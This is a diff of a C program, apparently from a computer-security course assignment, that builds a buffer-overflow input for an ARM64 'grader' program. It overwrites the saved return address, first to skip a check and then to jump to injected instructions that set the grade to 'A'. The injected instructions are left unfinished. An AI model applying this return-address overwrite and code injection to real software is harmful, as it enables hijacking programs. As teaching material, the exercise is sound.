@@ -12,22 +12,36 @@
 int main(void){
    FILE *psFile;
    unsigned long ulData;
-   unsigned long pskipIf;
+   unsigned int ulInstruction;
+   unsigned long pAAttack;
    int i;
 
-   psFile = fopen("dataB", "w");
+   psFile = fopen("dataA", "w");
    
    /* Writes the student's names */
-   ulData = 0x6E655678614D;
+   ulData = 0x00006E655678614D;
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
-   /* Writes the null byte at the end of the students names*/
-   for (i = 0; i < 40; i++)
+   /* mov w0, 'A'   */
+   ulInstruction = 0;
+
+   /* adr x1, grade */
+
+
+   /* strb wo, [x1] */
+
+
+   /* b  printf     */
+
+
+
+   /* Writes the null byte at the end of the instructions */
+   for (i = 0; i < 24; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
-   /* Writes the new x30 for getName to skip the iff */
-   pskipIf = 0x400890;
-   fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);
+   /* Writes the new x30 for getName to skip to our assembly */
+   pAAttack = 0x420058;
+   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
 
